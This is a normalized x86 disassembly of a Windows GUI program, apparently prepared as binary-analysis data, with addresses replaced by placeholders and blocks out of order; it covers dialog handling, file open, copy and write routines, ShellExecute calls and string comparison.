mov al [ esp + 0x13 ]
test al al
je r-xdata
xor eax eax
mov al [ esi ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
push 0xa
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push r--data
call sub_404790
add esp 0x8
test eax eax
je r-xdata
mov ebp 0x10
mov al [ esp + 0x12 ]
test al al
je r-xdata
cmp [ esp + 0x30 ] 0x10
mov eax [ esp + 0x1c ]
jae r-xdata
xor edx edx
mov dl [ esi ]
mov ecx ebp
push edx
push 0x1
call sub_4017f0
inc esi
push eax
push 0x1
mov ecx ebp
call sub_4017f0
inc esi
push 0x9
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
push 0xffffffff
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx ebp
call sub_4018c0
mov eax [ esp + 0x2c ]
add esi 0xa
test eax eax
je r-xdata
mov ecx [ rw-data ]
imul esi esi 0x70
push 0xffffffff
add esi ecx
push 0x0
push esi
lea ecx [ esp + 0x44 ]
call sub_401dd0
mov [ esp + 0x88 ] edi
mov [ esp + 0x84 ] 0x0
mov [ esp + 0x74 ] 0x0
cmp [ esp + 0x50 ] 0x10
mov eax [ esp + 0x3c ]
mov [ esp + 0x198 ] 0x4
jae r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea edx [ esp + 0x54 ]
push edx
push r--data
call sub_404790
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
cmp [ esp + 0x50 ] ebp
mov esi 0xf
mov [ esp + 0x6c ] esi
mov [ esp + 0x68 ] edi
mov [ esp + 0x58 ] 0x0
jb r-xdata
mov eax [ esp + 0x58 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x6c ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x58 ]
jae r-xdata
push eax
call sub_404440
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x1c ]
cmp al 0x3c
jne r-xdata
push 0xa
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
push 0xffffffff
push eax
lea ecx [ esp + 0x5c ]
push ecx
mov ecx ebp
call sub_4018c0
mov eax [ esp + 0x68 ]
add esi 0x9
test eax eax
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov [ esp + 0x13 ] 0x1
jmp r-xdata
push eax
call sub_404440
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x3c ]
mov ecx [ rw-data ]
imul esi esi 0x70
push 0xffffffff
add esi ecx
push 0x0
push esi
lea ecx [ esp + 0x24 ]
call sub_401dd0
jmp r-xdata
lea ecx [ esp + 0x54 ]
call sub_4480e0
lea ecx [ esp + 0x38 ]
call sub_4480e0
lea ecx [ esp + 0x18 ]
call sub_4480e0
lea ecx [ esp + 0x1a0 ]
call sub_4480e0
or eax 0xffffffff
jmp r-xdata
cmp [ esp + 0x30 ] ebp
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] edi
mov [ esp + 0x3c ] 0x0
jb r-xdata
mov ecx [ esp + 0x3c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push edi
push edi
push edi
push edi
push edi
push edi
xor edx edx
mov dl [ rw-data ]
push edi
push edi
push edx
push edi
push edi
push eax
call sub_43d820
jmp r-xdata
lea eax [ esp + 0x58 ]
mov eax [ rw-data ]
test eax eax
mov edi 0x1
je r-xdata
push 0xc
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
cmp ecx 0x10
mov eax [ esp + 0x1c ]
mov edi eax
jae r-xdata
mov [ esp + 0x12 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
lea ecx [ esp + 0x1c ]
call sub_402510
mov ecx [ esp + 0x190 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x18c
retn
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x6c ] ebp
jb r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ebx [ CreateFileA@IAT ]
push 0xc
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
push 0xffffffff
mov ecx ebp
push 0x0
je r-xdata
push eax
call sub_457f90
add esp 0x4
add eax edi
mov ecx eax
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
lea edi [ esp + 0x1c ]
lea eax [ esp + 0x1c ]
cmp [ esp + 0x50 ] 0x10
mov ecx [ esp + 0x3c ]
jae r-xdata
push 0xffffffff
push 0x0
lea edx [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x7c ]
call sub_401dd0
jmp r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
jne r-xdata
cmp [ esp + 0x30 ] 0x10
mov ecx [ esp + 0x1c ]
jae r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
cmp [ esp + 0x30 ] 0x10
mov ecx [ esp + 0x1c ]
jae r-xdata
push 0xb
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
call sub_4018c0
add esi 0xc
jmp r-xdata
push rw-data
call sub_4018c0
add esi 0xc
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
push eax
mov ecx ebp
call sub_401cc0
add esi 0xa
jmp r-xdata
mov eax [ rw-data ]
mov edx [ esp + 0x4c ]
sub edx eax
dec edx
lea eax [ ecx + eax + 0x1 ]
push edx
push eax
lea ecx [ esp + 0x78 ]
call sub_401e80
lea ecx [ esp + 0x3c ]
cmp [ esp + 0x88 ] 0x10
mov eax [ esp + 0x74 ]
jae r-xdata
cmp [ esp + 0x30 ] 0x10
mov eax [ esp + 0x1c ]
jae r-xdata
mov eax [ rw-data ]
mov esi [ rw-data ]
imul eax eax 0x70
push 0x0
push 0x0
push ecx
add eax esi
push 0x0
push eax
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
lea ecx [ esp + 0x1c ]
mov edx [ rw-data ]
imul edx edx 0x70
lea eax [ esp + 0x34 ]
push eax
mov eax [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
add edx eax
push edx
call sub_4adff0
add esp 0xc
test ebp ebp
jne r-xdata
cmp [ esp + 0x30 ] 0x10
mov eax [ esp + 0x1c ]
jae r-xdata
push 0x0
push ecx
push eax
call [ CopyFileA@IAT ]
mov edi eax
jmp r-xdata
lea ecx [ esp + 0x1c ]
push 0x6
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
push 0xffffffff
push eax
lea edx [ esp + 0x40 ]
push edx
mov ecx ebp
call sub_4018c0
add esi 0xb
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov edi eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov edi eax
jae r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push eax
call sub_404790
add esp 0x8
test eax eax
je r-xdata
lea eax [ esp + 0x74 ]
push 0x0
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_43d820
mov edi eax
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x54 ]
call sub_4480e0
lea ecx [ esp + 0x38 ]
call sub_4480e0
lea ecx [ esp + 0x18 ]
call sub_4480e0
lea ecx [ esp + 0x1a0 ]
call sub_4480e0
mov eax 0xfffffffe
jmp r-xdata
test edi edi
jne r-xdata
push 0x64
call [ Sleep@IAT ]
push 0x1b
call [ GetAsyncKeyState@IAT ]
test ah ah
jns r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call ebx
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x1c ]
push 0x7
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
inc eax
push eax
lea ecx [ esp + 0x94 ]
push r--data
push ecx
call ebx
add esp 0xc
lea edx [ esp + 0x90 ]
push edx
mov ecx ebp
call sub_402010
add esi 0x6
jmp r-xdata
push eax
call sub_457f90
add eax edi
add esp 0x4
mov ecx ebp
push eax
call sub_402010
add esi 0xc
jmp r-xdata
mov edi rw-data
mov eax edi
mov edi rw-data
mov eax edi
jmp r-xdata
lea ecx [ esp + 0x70 ]
mov [ esp + 0x198 ] bl
call sub_4480e0
lea ecx [ esp + 0x70 ]
call sub_4480e0
mov eax [ rw-data ]
mov ebp [ rw-data ]
imul eax eax 0x70
push 0x1
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x1c ]
add eax ebp
push edx
push eax
call sub_4af910
mov ebp eax
mov eax [ esp + 0x44 ]
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0x0
lea eax [ esp + 0x90 ]
push eax
push ecx
call [ GlobalSize@IAT ]
mov edx [ esp + 0x1c ]
push eax
push edx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
xor edi edi
jmp r-xdata
push 0xb
push r--data
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov ecx rw-data
call sub_4010f0
mov ecx [ rw-data ]
cmp ecx eax
jge r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ esp + 0x94 ]
push r--data
push edx
call ebx
add esp 0xc
lea eax [ esp + 0x90 ]
push eax
mov ecx ebp
call sub_402010
add esi 0xb
jmp r-xdata
add esi 0x7
jmp r-xdata
mov eax [ rw-data ]
imul ecx ecx 0x70
mov ecx [ ecx + eax + 0x38 ]
push ecx
lea edx [ esp + 0x94 ]
push r--data
push edx
call ebx
add esp 0xc
lea eax [ esp + 0x90 ]
push eax
mov ecx ebp
call sub_402010
sub_42f970
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bff2c
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x1c4
sub eax 0x110
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ rw-data ]
mov ebp 0x10
cmp eax ebp
mov eax [ rw-data ]
jae r-xdata
dec eax
je r-xdata
mov esi [ esp + 0x1e4 ]
mov edi [ SendDlgItemMessageA@IAT ]
push eax
xor ebx ebx
push ebx
push 0xc
push 0xdba
push esi
call edi
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
mov eax [ esp + 0x1ec ]
cmp ax 0x1
jne r-xdata
sub eax 0x12f0
jne r-xdata
push eax
push ebx
push 0xc
push 0xdbc
push esi
call edi
push ebx
push ebx
push 0x1401
push esi
call [ PostMessageA@IAT ]
mov eax rw-data
cmp ax 0x2
jne r-xdata
mov esi [ esp + 0x1e4 ]
mov edi [ SendDlgItemMessageA@IAT ]
xor ebx ebx
push ebx
push ebx
push 0xe
push 0xdba
push esi
call edi
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
mov ebp 0xf
mov [ esp + 0x7c ] ebp
mov [ esp + 0x78 ] ebx
mov [ esp + 0x68 ] bl
mov [ esp + 0x1dc ] ebx
mov [ esp + 0x28 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
mov [ esp + 0x44 ] ebp
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov [ esp + 0x60 ] ebp
mov [ esp + 0x5c ] ebx
mov [ esp + 0x4c ] bl
mov esi [ esp + 0x1e4 ]
mov edi [ SendDlgItemMessageA@IAT ]
push ebx
push ebx
push 0xe
push 0xdba
push esi
mov [ esp + 0x1f0 ] 0x3
call edi
mov ecx [ esp + 0x24 ]
cmp eax ecx
ja r-xdata
cmp ax 0xdbe
jne r-xdata
mov eax [ esp + 0x1e4 ]
push 0x2
push eax
call [ EndDialog@IAT ]
jmp r-xdata
sub eax ecx
push ebx
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov ecx [ esp + 0x1d4 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1d0
retn
sub eax ecx
push ebx
push eax
lea ecx [ esp + 0x18 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x18 ]
call sub_401ba0
jmp r-xdata
cmp ax 0xdba
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov eax 0x1
mov ecx [ rw-data ]
push eax
inc ecx
push ecx
push 0xd
push 0xdba
push esi
call edi
push ebx
push ebx
push 0xe
push 0xdbc
push esi
call edi
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
mov eax [ rw-data ]
mov ebp 0x10
cmp eax ebp
mov eax [ rw-data ]
jae r-xdata
push eax
mov eax [ esp + 0x28 ]
inc eax
push eax
push 0xd
push 0xdba
push esi
call edi
push ebx
push ebx
push 0xe
push 0xdbc
push esi
call edi
mov ecx [ esp + 0x40 ]
cmp eax ecx
ja r-xdata
lea eax [ esp + 0x14 ]
cmp [ esp + 0x28 ] 0x10
mov eax [ esp + 0x14 ]
jae r-xdata
shr eax 0x10
cmp eax 0x300
jne r-xdata
cmp ax 0xdbc
jne r-xdata
push 0x104
push eax
lea ecx [ esp + 0xd8 ]
push ecx
call [ lstrcpynA@IAT ]
mov esi [ esp + 0x1e4 ]
xor eax eax
push 0xfffffffa
mov ecx 0x13
lea edi [ esp + 0x88 ]
[ edi ]
push esi
mov [ esp + 0x8c ] 0x4c
mov [ esp + 0x90 ] esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x8c ] eax
mov eax 0x103
mov [ esp + 0xa4 ] eax
mov [ esp + 0xac ] eax
lea eax [ esp + 0x84 ]
lea edx [ esp + 0xd0 ]
xor ebx ebx
push eax
mov [ esp + 0x94 ] r--data
mov [ esp + 0xa0 ] 0x1
mov [ esp + 0xa4 ] edx
mov [ esp + 0xac ] ebx
mov [ esp + 0xb4 ] r--data
mov [ esp + 0xb8 ] r--data
mov [ esp + 0xbc ] 0x1004
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
mov eax rw-data
sub eax ecx
push ebx
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
sub eax ecx
push ebx
push eax
lea ecx [ esp + 0x34 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x34 ]
call sub_401ba0
jmp r-xdata
mov edx [ esp + 0x1e4 ]
xor ebx ebx
push ebx
push ebx
push 0x1401
push edx
call [ PostMessageA@IAT ]
cmp [ esp + 0xd0 ] bl
je r-xdata
mov edx [ rw-data ]
push eax
inc edx
push edx
push 0xd
push 0xdbc
push esi
call edi
push 0x1
push esi
call [ EndDialog@IAT ]
jmp r-xdata
mov eax rw-data
cmp [ rw-data ] ebp
mov eax [ rw-data ]
jae r-xdata
mov ecx [ esp + 0x40 ]
push eax
inc ecx
push ecx
push 0xd
push 0xdbc
push esi
call edi
push ebx
lea edx [ esp + 0x4c ]
push edx
sub esp 0x1c
mov ecx esp
mov [ esp + 0xa4 ] esp
push 0xffffffff
push ebx
lea eax [ esp + 0x58 ]
mov [ ecx + 0x18 ] ebp
mov [ ecx + 0x14 ] ebx
push eax
mov [ ecx + 0x4 ] bl
call sub_401dd0
call sub_42f130
add esp 0x24
push 0xffffffff
push ebx
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x70 ]
call sub_401dd0
cmp [ esp + 0x5c ] ebx
je r-xdata
lea eax [ esp + 0x30 ]
cmp [ esp + 0x44 ] 0x10
mov eax [ esp + 0x30 ]
jae r-xdata
lea ecx [ esp + 0xd0 ]
push ecx
push ebx
push 0xc
push 0xdba
push esi
call [ SendDlgItemMessageA@IAT ]
xor eax eax
jmp r-xdata
cmp [ esp + 0x7c ] 0x10
mov eax [ esp + 0x68 ]
jae r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
push eax
push ebx
push 0xc
push 0xdbd
push esi
call edi
mov eax [ esp + 0x60 ]
mov esi 0x10
cmp eax esi
jb r-xdata
lea eax [ esp + 0x68 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x6c ]
call sub_401cc0
push 0xffffffff
push ebx
lea edx [ esp + 0x50 ]
push edx
lea ecx [ esp + 0x70 ]
call sub_4018c0
cmp [ esp + 0x44 ] esi
mov [ esp + 0x60 ] ebp
mov [ esp + 0x5c ] ebx
mov [ esp + 0x4c ] bl
jb r-xdata
mov eax [ esp + 0x4c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x28 ] esi
mov [ esp + 0x44 ] ebp
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
jb r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x7c ] esi
mov [ esp + 0x28 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
jb r-xdata
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
jmp r-xdata
sub_42fe70
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bff50
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
mov ecx [ esp + 0x48 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x48
retn
mov edi 0xf
mov [ esp + 0x44 ] edi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
mov eax r--data
mov [ esp + 0x50 ] ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x34 ]
call sub_401cc0
push 0xffffffff
push ebx
push rw-data
lea ecx [ esp + 0x38 ]
call sub_4018c0
mov eax r--data
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push r--data
lea ecx [ esp + 0x34 ]
call sub_401cc0
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
push 0x1
lea eax [ esp + 0x14 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
push 0xffffffff
push ebx
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] ebx
push rw-data
mov [ esp + 0x80 ] 0x1
mov [ ecx + 0x4 ] bl
call sub_401dd0
call sub_42f130
add esp 0x24
cmp eax ebx
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
mov esi 0x10
cmp eax esi
jae r-xdata
mov ecx [ rw-data ]
push ebx
push r--data
push r--data
push ecx
call [ MessageBoxA@IAT ]
mov eax [ esp + 0x28 ]
mov esi 0x10
cmp eax esi
jb r-xdata
cmp [ rw-data ] esi
mov eax [ rw-data ]
jae r-xdata
lea ecx [ esp + 0x14 ]
cmp [ esp + 0x44 ] esi
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
jb r-xdata
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push 0x1
push ebx
push ecx
mov ecx [ rw-data ]
push eax
push r--data
push ecx
call [ ShellExecuteA@IAT ]
cmp eax 0x20
jge r-xdata
mov eax rw-data
mov eax [ esp + 0x30 ]
push eax
jmp r-xdata
cmp [ esp + 0x28 ] esi
jb r-xdata
mov edx [ rw-data ]
push ebx
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x44 ] esi
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x30 ]
push ecx
sub_430070
sub esp 0x58
mov eax [ esp + 0x5c ]
push ebx
mov ebx [ lstrlenA@IAT ]
push ebp
push esi
push edi
push eax
mov [ esp + 0x14 ] eax
call ebx
mov eax [ esp + 0x70 ]
push eax
call ebx
mov [ esp + 0x14 ] eax
mov al [ esp + 0x7c ]
test al al
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x58
retn
nop
mov al [ esp + 0x78 ]
test al al
je r-xdata
lea ecx [ ecx ]
mov ebx [ esp + 0x6c ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
sub ecx ebx
mov eax ecx
sub eax edi
pop edi
movzx ecx cx
pop esi
movzx eax ax
shl ecx 0x10
pop ebp
or eax ecx
pop ebx
add esp 0x58
retn
mov eax [ esp + 0x70 ]
push eax
call ebx
mov ebp [ esp + 0x10 ]
mov ecx [ esp + 0x6c ]
sub ebp ecx
sub ebp eax
cmp ebp 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
test ebp ebp
jbe r-xdata
mov cl [ ecx + ebp - 0x2 ]
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
cmp [ esp + 0x74 ] 0x1
je r-xdata
mov ax [ esi ]
mov edx [ esp + 0x10 ]
cmp ax [ edx ]
jne r-xdata
mov edi [ esp + 0x10 ]
mov al [ edi ]
test al al
je r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov edx [ r--data ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] eax
mov al [ r--data ]
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] al
xor esi esi
call ebx
test eax eax
jle r-xdata
mov ecx 0x5
mov esi r--data
lea edi [ esp + 0x38 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea edx [ esp + 0x38 ]
movsb [ edi ] [ esi ]
push edx
xor esi esi
call ebx
test eax eax
jle r-xdata
cmp al cl
jne r-xdata
cmp al 0x61
jb r-xdata
mov esi [ esp + 0x70 ]
add esi 0x2
jmp r-xdata
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
mov esi [ esp + 0x70 ]
cmp [ esi ] 0x0
je r-xdata
mov edi [ esp + 0x6c ]
lea esp [ esp ]
inc esi
jmp r-xdata
cmp al 0x41
jb r-xdata
cmp al 0x7a
ja r-xdata
inc eax
add eax 0x2
jmp r-xdata
mov eax [ esp + 0x10 ]
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
mov eax [ r--data ]
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x28 ] edx
mov dl [ r--data ]
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] dl
xor esi esi
call ebx
test eax eax
jle r-xdata
mov ecx 0x5
mov esi r--data
lea edi [ esp + 0x50 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea ecx [ esp + 0x50 ]
movsb [ edi ] [ esi ]
push ecx
xor esi esi
call ebx
test eax eax
jle r-xdata
lea eax [ esp + 0x18 ]
push eax
inc esi
call ebx
cmp esi eax
jl r-xdata
lea edx [ esp + 0x38 ]
push edx
add esi 0x2
call ebx
cmp esi eax
jl r-xdata
cmp al 0x5a
ja r-xdata
cmp al cl
je r-xdata
mov ecx [ esp + 0x10 ]
mov cl [ ecx ]
test cl cl
je r-xdata
jmp r-xdata
mov [ esp + 0x10 ] eax
cmp [ esi ] 0x0
jne r-xdata
lea esp [ esp ]
jmp r-xdata
mov dl [ edi + ebp - 0x1 ]
cmp dl [ esp + esi + 0x18 ]
je r-xdata
jmp r-xdata
mov eax [ esp + 0x6c ]
mov cx [ eax + ebp - 0x2 ]
cmp cx [ esp + esi + 0x38 ]
je r-xdata
jmp r-xdata
cmp al cl
je r-xdata
inc esi
jmp r-xdata
movsx eax al
movsx edx cl
sub eax 0x20
cmp eax edx
jne r-xdata
lea edx [ esp + 0x28 ]
push edx
inc esi
call ebx
cmp esi eax
jl r-xdata
mov edx [ esp + 0x10 ]
mov ax [ edx ]
cmp ax [ esp + esi + 0x50 ]
je r-xdata
inc esi
jmp r-xdata
movsx eax al
movsx edx cl
add eax 0x20
cmp eax edx
jne r-xdata
mov cl [ edi ]
cmp cl [ esp + esi + 0x28 ]
je r-xdata
jmp r-xdata
lea ecx [ esp + 0x50 ]
push ecx
add esi 0x2
call ebx
cmp esi eax
jl r-xdata
jmp r-xdata
sub_430320
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push esi
mov esi [ rw-data ]
and esi 0x7
mov eax [ esi * 4 + rw-data ]
push 0x552
push ecx
mov [ rw-data ] eax
call [ IsDlgButtonChecked@IAT ]
test al 0x1
je r-xdata
push 0x0
push 0x0
push 0x8
push eax
call [ SendMessageA@IAT ]
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop esi
lea edx [ esi + esi * 2 ]
mov eax [ edx * 4 + rw-data ]
shl esi 0x4
add esi rw-data
mov ecx [ esi + 0x4 ]
dec eax
test ecx ecx
mov [ rw-data ] eax
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
dec eax
mov [ rw-data ] eax
pop esi
retn
xor eax eax
dec eax
mov [ rw-data ] eax
pop esi
retn
sub_4303c0
mov eax [ esp + 0x4 ]
sub esp 0x138
push ebx
push ebp
xor ebp ebp
cmp eax ebp
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x138
retn
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov cl [ esp + 0x150 ]
and eax 0x7
mov ebx eax
shl ebx 0x4
test cl cl
je r-xdata
lea ecx [ eax + eax * 2 ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ ebx + rw-data ]
cmp ecx ebp
mov esi 0x1
mov [ esp + 0x18 ] edx
mov [ esp + 0x24 ] esi
jne r-xdata
mov ecx 0xffffffff
mov [ esp + 0x18 ] ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] ecx
mov ecx [ ebx + rw-data ]
cmp ecx ebp
jne r-xdata
mov edx [ ebx + rw-data ]
sub edx ecx
sar edx 0x2
mov [ esp + 0x14 ] edx
mov [ esp + 0x14 ] ebp
jmp r-xdata
mov edx [ ebx + rw-data ]
sub edx ecx
sar edx 0x2
dec edx
mov [ esp + 0x1c ] edx
jmp r-xdata
xor edx edx
dec edx
mov [ esp + 0x1c ] edx
jmp r-xdata
mov edx [ edx ]
xor edx edx
jmp r-xdata
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] ebp
mov ecx [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
mov edx [ eax + rw-data ]
cmp edx ebp
jne r-xdata
inc edx
push edx
lea ecx [ esp + 0x4c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ rw-data ]
add esp 0xc
push 0x2000
push r--data
lea edx [ esp + 0x50 ]
push edx
push eax
call [ MessageBoxA@IAT ]
call sub_430320
cmp edx [ eax + rw-data ]
jge r-xdata
mov edi edx
mov edx [ rw-data ]
cmp edx ebp
jl r-xdata
cmp edx ebp
jle r-xdata
cmp edx [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
je r-xdata
mov eax edx
nop
cmp ecx [ esp + 0x14 ]
mov ebp ecx
je r-xdata
dec eax
mov edi [ edi ]
jne r-xdata
mov al [ esp + 0x150 ]
test al al
je r-xdata
nop
mov edi [ edi ]
mov edi [ edi + 0x4 ]
jmp r-xdata
mov edx [ edi + 0x8 ]
imul eax eax 0x1c
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax + 0x34 ]
mov ecx 0x10
cmp edx ecx
jb r-xdata
mov eax [ esp + 0x10 ]
mov ebp [ esp + 0x24 ]
mov esi [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
add eax ebp
cmp eax esi
mov [ esp + 0x10 ] eax
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea esi [ eax + 0x20 ]
mov esi [ eax + 0x20 ]
jmp r-xdata
test ebp ebp
mov ecx [ esp + 0x10 ]
mov edi [ SendMessageA@IAT ]
mov edx [ rw-data ]
lea eax [ esp + 0x28 ]
push eax
push ecx
jne r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
add ebp ecx
cmp ebp eax
jne r-xdata
mov ecx [ esp + 0x15c ]
mov edx [ esp + 0x158 ]
push ecx
mov ecx [ esp + 0x158 ]
push edx
mov edx [ esp + 0x154 ]
push ecx
push edx
push eax
call sub_430070
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
add eax 0x20
push eax
call sub_457f40
add esp 0x4
add eax esi
jmp r-xdata
mov eax [ eax + 0x20 ]
push eax
call sub_457f40
